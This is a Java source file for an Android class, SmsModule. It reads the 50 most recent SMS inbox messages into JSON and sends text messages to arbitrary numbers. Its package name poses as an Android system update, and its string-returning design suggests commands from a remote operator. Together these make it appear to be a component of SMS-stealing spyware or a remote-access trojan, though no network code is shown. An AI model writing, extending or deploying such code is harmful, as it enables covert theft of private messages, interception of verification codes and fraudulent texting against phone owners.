package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Base64;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsModule {
    private Context context;
    
    public SmsModule(Context context) {
        this.context = context;
    }
    
    public String getSms() {
        if (!checkReadPermission()) return "ERROR: No SMS read permission";
        
        try {
            JSONArray smsList = new JSONArray();
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), 
                null, null, null, "date DESC LIMIT 50");
            
            if (cursor != null && cursor.moveToFirst()) {
                int addressIdx = cursor.getColumnIndex("address");
                int bodyIdx = cursor.getColumnIndex("body");
                int dateIdx = cursor.getColumnIndex("date");
                
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(addressIdx));
                    sms.put("body", cursor.getString(bodyIdx));
                    sms.put("date", cursor.getLong(dateIdx));
                    smsList.put(sms);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            return smsList.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String sendSms(String number, String message) {
        if (!checkSendPermission()) return "ERROR: No SMS send permission";
        
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            return "SMS sent to " + number;
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkReadPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkSendPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
}